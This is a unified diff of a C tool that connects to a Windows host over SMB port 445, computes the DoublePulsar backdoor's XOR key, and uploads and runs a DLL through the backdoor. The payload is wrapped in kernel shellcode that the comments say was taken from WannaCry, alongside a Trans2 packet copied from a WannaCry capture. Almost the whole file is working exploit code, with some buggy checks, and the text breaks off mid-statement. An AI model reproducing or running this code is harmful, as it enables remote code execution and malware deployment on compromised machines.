@@ -1,16 +1,11 @@
 #define _CRT_SECURE_NO_WARNINGS
-/*
-DoublePulsar Upload DLL and Execute command using a structure.
-
-Structure is not finished yet, need to add the NetBIOS header & add code to populate the length field.
-*/
 
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <winsock.h>
-#pragma comment(lib,"wsock32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 unsigned char SmbNegociate[] =
 "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
@@ -26,15 +21,6 @@ unsigned char Session_Setup_AndX_Request[] =
 "\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
 "\x62\x00";
 
-/* 
-unsigned char TreeConnect_AndX_Request[] =
-"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
-"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
-"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
-"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
-"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
-"\x3f\x00";*/
 unsigned char SMB_TreeConnectAndX[] =
 "\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
@@ -42,9 +28,8 @@ unsigned char SMB_TreeConnectAndX[] =
 
 unsigned char SMB_TreeConnectAndX_[] = "\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";
 
-
 //Fixed Trans2 session setup PING packet.  This should work
-unsigned char trans2_request[] = 
+unsigned char trans2_request[] =
 "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE"
 "\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
@@ -53,155 +38,15 @@ unsigned char trans2_request[] =
 "\x00\x00";
 
 //Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
-unsigned char wannacry_Trans2_Request[] = 
+unsigned char wannacry_Trans2_Request[] =
 "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
 "\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
 "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
-"\x00\x0e\x00\x0d\x10\x00"; /* d1 c9 10 17 d9 aa 40 17 d9 da 69 17 ( Example SESSION_SETUP Parameters ) */
-
-/*
-Copied from Wannacry PCAP:
-
-Wannacry Trans2 Request, SESSION_SETUP 
-00 00 10 4e ff 53 4d 42 32 00 00 00 00 18 07 c0
-00 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe
-00 08 42 00 0f 0c 00 00 10 01 00 00 00 00 00 00
-00 25 89 1a 00 00 00 0c 00 42 00 00 10 4e 00 01
-00 0e 00 0d 10 00 
-
-SESSION_SETUP Parameters:
-d1 c9 10 17 d9 aa 40 17 d9 da 69 17
-*/
-
-#pragma pack(1)
-typedef struct {
-	uint16 SmbMessageType; //0x00
-	uint16 SmbMessageLength; 
-	uint8 ProtocolHeader[4]; //"\xffSMB"
-	uint8 SmbCommand; 
-	uint32 NtStatus; //0x00000000
-	uint8 flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
-	uint16 flags2;  //0xC007
-	uint16 ProcessIDHigh; //0x00
-	uint8 signature[8]; //0x00000000000
-	uint16 reserved; //0x0000
-	uint16 TreeId; 
-	uint16 ProccessID; //0xfeff
-	uint16 UserID; 
-	uint16 multipleID;
-
-	uint8 WordCount;
-	uint16 TotalParameterCount;
-	uint16 TotalDataCount;
-	uint16 MaxParameterCount;
-	uint16 MaxDataCount;
-	uint8 MaxSetupCount;
-	uint8 reserved;
-	uint16 flags;
-	uint32 timeout;   // 0x25 0x89 0x1a 0x00
-	uint16 reserved2;
-	uint16 ParameterCount;
-	uint16 ParameterOffset;
-	uint16 DataCount; //4096
-	uint16 DataOffset; //78
-	uint8 SetupCount; 
-	uint8 reserved3;
-	uint16 Function; //0x0e00 also known as Subcommand in Wireshark
-	uint16 ByteCount; //4109 or 0x0d 0x10
-	uint8 padding;
-	//uint8 TransactionName[14]; 
-	//uint16 padding2;
-	char SESSION_DATA_PARAMETERS[12]; //Wannacry uses 12 as the size
-	char payload[4096];
-} SMB_COM_TRANSACTION2_STRUCT;
-#pragma pack(pop)
-
-/*
-	Sample SESSION_SETUP parameter values:
-	42 30 80 57 42 d0 d0 57 42 d0 e6 57
-
-	SMB_COM_TRANSACTION2_STRUCT trans2;
-	trans2.SmbCommand = 0x32;
-	trans2.Flags1 = 0x18;
-	trans2.Flags2 = 0xc007;
-	trans2.WordCount = 14 + setup_count; 
-	trans2.TreeID = treeid; //extracted earlier
-	trans2.multipleid  = 41;
-	trans2.ParamCountTotal = param.length;
-	trans2.DataCountTotal = bodyCount; //Count of the whole data being sent
-	trans2.ParamCountMax = 1;
-	trans2.DataCountMax = 0;
-	trans2.ParamCount = param.length;
-	trans2.ParamOffset = param_offset;
-	trans2.DataCount = lpbdata.dwSize;
-	trans2.DataOffset = data_offset;
-	trans2.SetupCount = setup_count;
-	trans2.SetupData = setup_data;
-	trans2.timeout = 0x25891a00;
-	trans2.payload = lpbdata.dwData;
-
-	send(socket, (char*)trans2, sizeof(trans2), 0);
-
-*/
-
-/*
-//0x32
-typedef struct
-{
-    unsigned char wordcount;
-    struct
-    {
-        unsigned short TotalParameterCount;
-        unsigned short TotalDataCount;
-        unsigned short MaxParameterCount;
-        unsigned short MaxDataCount;
-        unsigned char  MaxSetupCount;
-        unsigned char  Reserved1;
-        unsigned short Flags;
-        unsigned int  Timeout;
-        unsigned short Reserved2;
-        unsigned short ParameterCount;
-        unsigned short ParameterOffset;
-        unsigned short DataCount;
-        unsigned short DataOffset;
-        unsigned char  SetupCount;
-        unsigned char  Reserved3;
-        unsigned short Setup[1];
-    }words;
-}rqpara32;
-
-typedef struct
-{
-    unsigned char wordcount;
-    struct
-    {
-        unsigned short TotalParameterCount;
-        unsigned short TotalDataCount;
-        unsigned short Reserved1;
-        unsigned short ParameterCount;
-        unsigned short ParameterOffset;
-        unsigned short ParameterDisplacement;
-        unsigned short DataCount;
-        unsigned short DataOffset;
-        unsigned short DataDisplacement;
-        unsigned char SetupCount;
-        unsigned char Reserved2;
-    }words;
-}rppara32;
-
-typedef struct
-{
-    unsigned short bytecount;
-    struct
-    {
-        char s[4000];
-    }bytes;
-}rpdata32;
-*/
+"\x00\x0e\x00\x0d\x10\x00";
 
 //64 bit kernel shellcode to run DLL - taken from Wannacry, this is sent before the DLL payload
-unsigned char kernel_rundll_shellcode[] = 
+unsigned char kernel_rundll_shellcode[] =
 "\x48\x89\xE0\x66\x83\xE4\xF0\x41\x57\x41\x56\x41\x55\x41\x54\x53"
 "\x51\x52\x55\x57\x56\x50\x50\xE8\xBC\x06\x00\x00\x48\x89\xC3\x48\xB9\xDF\x81\x14\x3E\x00\x00\x00\x00\xE8\x26"
 "\x05\x00\x00\x48\x85\xC0\x0F\x84\x55\x03\x00\x00\x48\x89\x05\x9C\x07\x00\x00\x48\xB9\xBA\x1E\x03\xA0\x00\x00"
@@ -431,37 +276,17 @@ unsigned char kernel_rundll_shellcode[] =
 "\x29\xD9\x48\x89\xDF\xF3\xAA\x48\x8D\x0D\x0D\x00\x00\x00\x48\x8D\x1D\x96\xF0\xFF\xFF\x48\x29\xD9\x48\x89\xDF"
 "\xF3\xAA\x58\x41\x5F\x41\x5E\x41\x5D\x41\x5C\x5E\x5F\x5D\x5B\xC3\xEB\x08\x00\x14\x00\x00\x01\x00\x00\x00";
 
-//globals
-unsigned char recvbuff[2048];
-
-int xor_payload(unsigned int xor_key, char *buf, int size)
+unsigned int LE2INT(unsigned char* data)
 {
-	int i;
-	char __xor_key[5];
-	i = 0;
-	*&__xor_key[1] = 0;
-	*__xor_key = xor_key;
-	if (size <= 0)
-		return 0;
-	do
-	{
-		*(i + buf) ^= __xor_key[i % 4];
-		++i;
-	} while ( i < size );
-	return 0;
-}
-
-unsigned int LE2INT(unsigned char *data)
-{
-            unsigned int b;
-            b = data[3];
-            b <<= 8;
-            b += data[2];
-            b <<= 8;
-            b += data[1];
-            b <<= 8;
-            b += data[0];
-            return b;
+	unsigned int b;
+	b = data[3];
+	b <<= 8;
+	b += data[2];
+	b <<= 8;
+	b += data[1];
+	b <<= 8;
+	b += data[0];
+	return b;
 }
 
 unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
@@ -470,7 +295,7 @@ unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig)
 		(((sig << 16) | sig & 0xFF00) << 8));
 }
 
-void convert_name(char *out, char *name)
+void convert_name(char* out, char* name)
 {
 	unsigned long len;
 	len = strlen(name);
@@ -481,6 +306,54 @@ void convert_name(char *out, char *name)
 	}
 }
 
+void hexDump(char* desc, void* addr, int len)
+{
+	int i;
+	unsigned char buff[17];
+	unsigned char* pc = (unsigned char*)addr;
+
+	// Output description if given.
+	if (desc != NULL)
+		printf("%s:\n", desc);
+
+	// Process every byte in the data.
+	for (i = 0; i < len; i++) {
+		// Multiple of 16 means new line (with line offset).
+
+		if ((i % 16) == 0) {
+			// Just don't print ASCII for the zeroth line.
+			if (i != 0)
+				printf("  %s\n", buff);
+
+			// Output the offset.
+			printf("  %04x ", i);
+		}
+
+		// Now the hex code for the specific character.
+		printf(" %02x", pc[i]);
+
+		// And store a printable ASCII character for later.
+		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
+			buff[i % 16] = '.';
+		}
+		else {
+			buff[i % 16] = pc[i];
+		}
+
+		buff[(i % 16) + 1] = '\0';
+	}
+
+	// Pad out last line if not exactly 16 characters.
+	while ((i % 16) != 0) {
+		printf("   ");
+		i++;
+	}
+
+	// And print the final ASCII bit.
+	printf("  %s\n", buff);
+}
+
+unsigned char recvbuff[2048];
 int main(int argc, char* argv[])
 {
 	WSADATA    ws;
@@ -489,17 +362,16 @@ int main(int argc, char* argv[])
 	DWORD    ret;
 	WORD    userid, treeid, processid, multiplexid;
 
-	WSAStartup(MAKEWORD(2, 2), &ws));
+	WSAStartup(MAKEWORD(2, 2), &ws);
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 	if (sock <= 0)
 	{
 		return 0;
 	}
 	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = inet_addr(argv[1]);
+	server.sin_addr.s_addr = inet_addr("192.168.0.17");
 	server.sin_port = htons((USHORT)445);
-	printf("Connecting %s\n", argv[1]);
-	ret = connect(sock, (struct sockaddr*) & server, sizeof(server));
+	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
 
 	//send SMB negociate packet
 	send(sock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
@@ -511,19 +383,18 @@ int main(int argc, char* argv[])
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//copy our returned userID value from the previous packet to the TreeConnect request packet
-	userid = *(WORD*)(recvbuff + 0x20);       //get userid
-	
+	userid = *(WORD*)(recvbuff + 0x20);
+
 	//Generates a new TreeConnect request with the correct IP address
 	//rather than the hard coded one embedded in the TreeConnect string
-	//generate dynamic TreeConnect packet
 	unsigned char packet[4096];
-	unsigned char *ptr;
+	unsigned char* ptr;
 	unsigned char tmp[1024];
 	unsigned short smblen;
 	ptr = packet;
 	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
 	ptr += sizeof(SMB_TreeConnectAndX) - 1;
-	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
+	sprintf((char*)tmp, "\\\\%s\\IPC$", "192.168.0.17");
 	convert_name((char*)ptr, (char*)tmp);
 	smblen = strlen((char*)tmp) * 2;
 	ptr += smblen;
@@ -536,38 +407,26 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (char*)&userid, 2); //update userid
+	memcpy(packet + 0x20, (char*)&userid, 2); //update userid in packet
 
 	//send modified TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-	
+
 	//copy the treeID from the TreeConnect response
 	treeid = *(WORD*)(recvbuff + 0x1c);       //get treeid
 
-	WORD processid, multiplexid;
-	//obtain ProcessID = smb_response[30][31]
-	//obtain Multiplex ID = smb_response[34][35]
-	
-	//unable to determine if this is used at this time
-	//kept for historical references.  will probably not be used in final version
-	processid = *(WORD*)(recvbuff + 30);
-	multiplexid = *(WORD*)(recvbuff + 34);
-
-	//Update treeID, Process ID, UserID, Multiplex ID
-	//update Multiplex ID to 65
+	//Update treeID, UserID
 	memcpy(trans2_request + 28, (char*)&treeid, 2);
-	//memcpy(trans2_request + 30, (char*)&processid, 2);
 	memcpy(trans2_request + 32, (char*)&userid, 2);
-	//memcpy(trans2_request + 34, (char*)&multiplexid, 2);
-	//trans2_request[34] = '\x41'; //update Multiplex ID to 41
+	//might need to update processid
+
 	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
 	//will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	
-	unsigned char signature[6]; //changed from 5 to 4 because I commented out the arch portion
+	unsigned char signature[6];
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
@@ -576,12 +435,10 @@ int main(int argc, char* argv[])
 	signature[3] = recvbuff[21];
 	signature[4] = recvbuff[22];
 	signature[5] = '\0';
-	
-	//this determines the architecture
+	//this is for determining architecture
 	//recvbuff[22];
-	//however at this time we are not using it
-	
-	
+	//but unused at this time
+
 	//convert the signature buffer to unsigned integer 
 	//memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
 	sig = LE2INT(signature);
@@ -589,9 +446,9 @@ int main(int argc, char* argv[])
 	//calculate the XOR key for DoublePulsar
 	unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig);
 	printf("Calculated XOR KEY:  0x%x\n", XorKey);
-	
+
 	//choose your DLL  here
-	char filename[MAX_PATH] = "payload.dll";
+	char filename[MAX_PATH] = "D:\\STRIKE\\artifact.dll";
 	printf("Loading file: %s\n", filename);
 	DWORD	dwFileSizeLow = NULL;
 	DWORD	dwFileSizeHigh = NULL;
@@ -620,209 +477,238 @@ int main(int argc, char* argv[])
 	}
 
 	CloseHandle(hFile);
-	
-	int total_payload_size = dwFileSizeLow + 6144;
-	unsigned char *encrypted;
-	encrypted = (unsigned char*)malloc(total_payload_size+1);
-	memset(encrypted,0x00,total_payload_size);
-	memcpy(encrypted, kernel_rundll_shellcode, 6144);
-	//copy DLL to offset after kernel shellcode
-	memcpy(encrypted + 6144, (char*)&pExeBuffer, dwFileSizeLow);
-	//patch values
+
 	printf("patching DLL + Userland shellcode size in Kernel shellcode...\n");
-	*(DWORD*)&kernel_rundll_shellcode[2158] = int(dwFileSizeLow + 3978);
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
+	printf("BEFORE:  ");
+	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
+	*(DWORD*)&kernel_rundll_shellcode[2158] = dwFileSizeLow + 3978;
+	printf("AFTER:  ");
+	hexDump(NULL, (char*)&kernel_rundll_shellcode[2158], 4);
 
 	printf("patching DLL size...\n");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	printf("BEFORE:  ");
+	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF82] = dwFileSizeLow;
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
+	printf("AFTER:  ");
+	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF82], 4);
 	printf("patching DLL ordinal...\n");
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
+	printf("BEFORE:  ");
+	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 	*(DWORD*)&kernel_rundll_shellcode[2166 + 0xF86] = 1;
-	//hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
-	printf("encrypting the shellcode + DLL with XorKey in buffer!\n");
-	xor_payload(XorKey, (char*)pExeBuffer, total_payload_size);
+	printf("AFTER:  ");
+	hexDump(NULL, (char*)&kernel_rundll_shellcode[2166 + 0xF86], 1);
 
-	//build packet buffer with 4178 bytes in length
-	//70 bytes for the Trans2 Session Setup packet header
-	//12 bytes for the SESSION_SETUP parameters
-	//then 4096 bytes for the SESSION_SETUP data ( encrypted payload )
-	//Then fill the packet with 0x00s and XOR it with the calculated key
-	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
-	memset(big_packet, 0x00, 4178+1);
+	int kernel_shellcode_size = sizeof(kernel_rundll_shellcode) / sizeof(kernel_rundll_shellcode[0]);
+	kernel_shellcode_size -= 1;
+	printf("Kernel shellcode size:  %d\n", kernel_shellcode_size);
+	int payload_totalsize = kernel_shellcode_size + dwFileSizeLow;
+	PBYTE pFULLBUFFER = new BYTE[payload_totalsize];
 
-	//Copy Trans2 Information
-	//Update the values (TreeID, UserID, Multiplex, ProcessID) for the SMB packet
-	//update the timeout to run the DoublePulsar commands
-	//Copy the encrypted shellcode & DLL in 4096 byte chunks
-	//reads the response from the SMB response packet to determine if status is good or bad
-	int ctx;
-	int encrypted_buffer_len = sizeof(encrypted)/sizeof(encrypted[0]);
-	int bytesLeft = encrypted_buffer_len;
-	printf("Uploading file...%d bytes to send\n", encrypted_buffer_len);
-	int numberofpackets = encrypted_buffer_len / 4096;
-	int iterations = encrypted_buffer_len % 4096;
-	printf("will send %d packets of data\n ", numberofpackets);
+	int numberofpackets = payload_totalsize / 4096;
+	int iterations = payload_totalsize % 4096;
+	printf("will send %d packets\n ", numberofpackets);
 	printf("%d as a remainder\n", iterations);
-	unsigned char Parametersbuffer[12];
-	
-	//PayloadSize is NOT correct; needs to be updated to actual value
-	unsigned int payload_size = 0x507308 ^ XorKey; //UPDATE PAYLOAD SIZE 
-	unsigned int chunk_size = 4096 ^ XorKey;
-	unsigned int o_offset = 0 ^ XorKey;
-	for (ctx = 0; ctx < encrypted_buffer_len;)
+
+	memcpy(pFULLBUFFER, kernel_rundll_shellcode, 6144);
+	memcpy(pFULLBUFFER + 6144, pExeBuffer, dwFileSizeLow);
+
+	//unsigned int XorKey = 0x58581162;
+	unsigned char byte_xor_key[5];
+	byte_xor_key[0] = (unsigned char)XorKey;
+	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
+	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
+	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
+	int i;
+
+	for (i = 0; i < payload_totalsize; i++)
 	{
+		pFULLBUFFER[i] ^= byte_xor_key[i % 4];
+	}
+
+	unsigned char Parametersbuffer[13];
+	unsigned int bytesLeft = payload_totalsize;
+
+	//for doublepulsar parameters
+	unsigned int TotalSizeOfPayload = payload_totalsize; 
+	unsigned int ChunkSize = 4096;
+	unsigned int OffsetofChunkinPayload = 0x0000;
+	int ctx;
+
+	//unsigned short smblen;
+	unsigned short smb_htons_len;
+
+	unsigned short TotalDataCount = 4096;
+	unsigned short DataCount = 4096;
+	unsigned short byteCount = 4096 + 13;
+
+	//unsigned char SMBDATA[4096];
+	//memset(SMBDATA, 0x00, 4096);
+	unsigned char* big_packet = (unsigned char*)malloc(4096 + 12 + 70);
+	int size_normal_packet = 4096 + 12 + 70;
+
+	unsigned char* last_packet = (unsigned char*)malloc(iterations + 12 + 70);
+	int size_last_packet = iterations + 12 + 70;
+
+	for (ctx = 0; ctx < payload_totalsize;)
+	{
+		memset((unsigned char*)big_packet, 0x00, 4096 + 12 + 70);
 		if (bytesLeft < 4096)
 		{
-			printf("Bytes left is less than 4096!...This will be the last & smaller packet!\n");
+			printf("Bytes left(%d) is less than 4096!...This will be the last & smaller packet!\n", bytesLeft);
+			smblen = bytesLeft + 70 + 12 - 4;
+			printf("Last packet size = %d\n", smblen);
+			smb_htons_len = htons(smblen);
 			
-			//copy the wannacry exec trans2 to big packet
-			memcpy(big_packet, wannacry_Trans2_Request, 70);
+			memset(Parametersbuffer, 0x00, 12);
+			memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+			memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&bytesLeft, 4);
+			memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
-			//update TreeId, UserID & ProcessID in packet
-			memcpy(big_packet + 28, (char*)&treeid, 2);
-			memcpy(big_packet + 30, (char*)&processid, 2);
-			memcpy(big_packet + 32, (char*)&userid, 2);
-			
-			//no need to update this to 42 because the packet is already set to 42
-			//if the command succeeds, DoublePulsar will increment by 10
-			//and return with x52 or 82
-			//big_packet[34] = '\x42';
+			for (i = 0; i < 13; i++)
+			{
+				Parametersbuffer[i] ^= byte_xor_key[i % 4];
+			}
 
-			//update Timeout for RunShellcode
-			//25 89 1a 00 is the opcode for RunShellcode & DLL
-			
-			//NOT NEEDED since this is already in the wannacry exec packet
-			/*
-			big_packet[49] = '\x25';
-			big_packet[50] = '\x89';
-			big_packet[51] = '\x1a';
-			big_packet[52] = '\x00';
-			*/
-			
-			//since this packet is smaller than the rest
-			//Update the SMB length to the size of: bytesLeft+70+12
-			//the total SMB length has to be changed because this packet is smaller than the rest
-			smblen = bytesLeft+70+12; //BytesLeft + DoublePulsar Exec Packet Length + Trans2 SESSION_SETUP parameters
-			memcpy(big_packet+3, &smblen, 1);
-			
-			//update ChunkSize to what's left
-			chunk_size = bytesLeft ^ XorKey;
-			//update Offset value to current offset value
-			o_offset = ctx ^ XorKey;
-			//copy separate parameter values to the Parametersbuffer value
-			memcpy(Parametersbuffer, (unsigned char*)&payload_size, 4);
-			memcpy(Parametersbuffer + 4, (unsigned char*)&chunk_size, 4);
-			memcpy(Parametersbuffer + 8, (unsigned char*)&o_offset, 4);
-			
-			//copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
-			memcpy(big_packet + 70, Parametersbuffer, 12);
-			
-			//copy bytes left in the encrypted buffer
-			memcpy(big_packet + 70 + 12, (unsigned char*)encrypted + ctx, bytesLeft);
+			hexDump(NULL, Parametersbuffer, 12);
 
-			send(sock, (char*)big_packet, smblen, 0);
+
+			//copy wannacry skeleton packet to big Trans2 packet
+			memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);
+
+			//update size
+			memcpy(last_packet + 2, &smb_htons_len, 2);
+			hexDump(NULL, (char*)&last_packet, 4);
+
+			TotalDataCount = bytesLeft;
+			DataCount = bytesLeft;
+			byteCount = bytesLeft + 13;
+
+			*(WORD*)(last_packet + 0x27) = TotalDataCount;
+			*(WORD*)(last_packet + 0x3b) = DataCount;
+			*(WORD*)(last_packet + 0x43) = byteCount;
+
+			memcpy((unsigned char*)last_packet + 0x27, (char*)&TotalDataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x3b, (char*)&DataCount, 2);
+			memcpy((unsigned char*)last_packet + 0x43, (char*)&byteCount, 2);
+
+			//Update treeID, UserID
+			memcpy((unsigned char*)last_packet + 28, (char*)&treeid, 2);
+			memcpy((unsigned char*)last_packet + 32, (char*)&userid, 2);
+
+			//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
+			memcpy((unsigned char*)last_packet + 70, (unsigned char*)Parametersbuffer, 12);
+
+			//copy encrypted payload
+			memcpy((unsigned char*)last_packet + 82, (unsigned char*)pFULLBUFFER + ctx, bytesLeft);
+
+			//send the payload
+			send(sock, (char*)last_packet, size_last_packet, 0);
 			recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-			
+
 			//DoublePulsar response: STATUS_NOT_IMPLEMENTED
 			if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 			{
 				printf("All data sent and got good response from DoublePulsar!\n");
 			}
-			goto multiplexcheck;
+
+			if (recvbuff[34] = 0x52)
+			{
+				printf("Doublepulsar returned 82!\n");
+			}
+			else {
+				printf("Doublepulsar didn't work!\n");
+			}
+
+			break;
 		}
-		
-		//copy the exec trans2 request to big_packet
-		memcpy(big_packet, wannacry_Trans2_Request, 70);
 
-		//update TreeId, UserID & ProcessID in packet
-		memcpy(big_packet + 28, (char*)&treeid, 2);
-		memcpy(big_packet + 30, (char*)&processid, 2);
-		memcpy(big_packet + 32, (char*)&userid, 2);
-		//memcpy(big_packet + 34, (char*)&multiplexid, 2);
-		
-		//NO need to update, this is already in the packet
-		//kept for historical purposes
-		//update multiplex id to 42
-		//if doublepulsar is successful, it will increment by 10
-		//if the DoublePulsar response is x52...then success! it ran!
-		//big_packet[34] = '\x42';
 
-		//Packet already contains this, no need to update the Timeout signature
-		//kept for historical purposes
-		//update Timeout for RunShellcode
-		//25 89 1a 00 is the opcode for RunShellcode & DLL
-		//big_packet[49] = '\x25';
-		//big_packet[50] = '\x89';
-		//big_packet[51] = '\x1a';
-		//big_packet[52] = '\x00';
-		
-		//update Offset value
-		o_offset = ctx ^ XorKey;
-		//copy separate parameter values to the Parametersbuffer value
-		memcpy(Parametersbuffer, (char*)&payload_size, 4);
-		memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
-		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
-		
-		//copy the parameters value to packet
-		memcpy(big_packet + 70, Parametersbuffer, 12);
-		
-		//copy 4096 bytes at a time from the XOR encrypted buffer
-		memcpy(big_packet + 70 + 12, (char*)encrypted+ctx, 4096);
+		memset(Parametersbuffer, 0x00, 12);
+		memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
+		memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
+		memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
 
-		//FIX ME!  Fix the data len values
-		//Trans2.Session_Data_Length = sizeof(encrypted);
-		
-		//FIX ME
-		//fix SMB data length in SMB header
-		smblen = 4096+70+12; //4096 + EXEC Packet + Trans2_SESSION_DATA parameter
-		memcpy(big_packet+3, &smblen, 1);
+		for (i = 0; i < 13; i++)
+		{
+			Parametersbuffer[i] ^= byte_xor_key[i % 4];
+		}
 
-		//send the payload(shellcode + dll) in chunk of 0x1000(4096) bytes to backdoor.
-		send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
+		hexDump(NULL, Parametersbuffer, 12);
+
+		//copy wannacry skeleton packet to big Trans2 packet
+		memcpy((unsigned char*)big_packet, (unsigned char*)wannacry_Trans2_Request, 70);
+
+		//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
+		memcpy((unsigned char*)big_packet + 70, (unsigned char*)Parametersbuffer, 12);
+
+		//copy encrypted payload
+		memcpy((unsigned char*)big_packet + 82, (unsigned char*)pFULLBUFFER + ctx, ChunkSize);
+
+		//Update treeID, UserID
+		memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
+		memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
+
+		//send the payload
+		send(sock, (char*)big_packet, size_normal_packet, 0);
 		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-		
-		//subtract BytesToRead by how much we sent
-		bytesLeft -= 4096;
-		//compare the NT_STATUS response to 0xC0000002 ( STATUS_NOT_IMPLEMENTED )
+
+		//DoublePulsar response: STATUS_NOT_IMPLEMENTED
 		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 		{
-			printf("Data sent and got good response from DoublePulsar!\n");
+			printf("All data sent and got good response from DoublePulsar!\n");
+		}
+
+		if (recvbuff[34] = 0x52)
+		{
+			printf("Doublepulsar returned 82!\n");
 		}
 		else {
-			printf("Not good!  Doesn't seem to be working!  DoublePulsar error! Exiting!\n");
-			goto cleanup;
+			printf("Doublepulsar didn't work!\n");
 		}
-	
-		//increment CTX pointer by 4096, so the correct bytes next loop will be copied
+
+		bytesLeft -= 4096;
 		ctx += 4096;
+		OffsetofChunkinPayload += 4096;
 	}
 
-multiplexcheck:
-	//command received successfully!
-	if (recvbuff[34] = 0x52)
-	{
-		printf("MultiplexID = x52 or 82...DoublePulsar ran successfully!\n");
-	}
-
-cleanup:
-	//free data for payload generation
-	if (payload.lpbData != NULL)
-	{
-		HeapFree(hProcHeap, 0, payload.lpbData);
-	}
-
-	//release pExeBuffer
 	delete pExeBuffer;
-	
-	//free the memory for the XOR buffer
-	free(encrypted);
-
-	//free the 4178 packet
+	delete pFULLBUFFER;
 	free(big_packet);
+	free(last_packet);
+
+	printf("Disconnecting!\n");
+
+	unsigned char disconnect_packet[] =
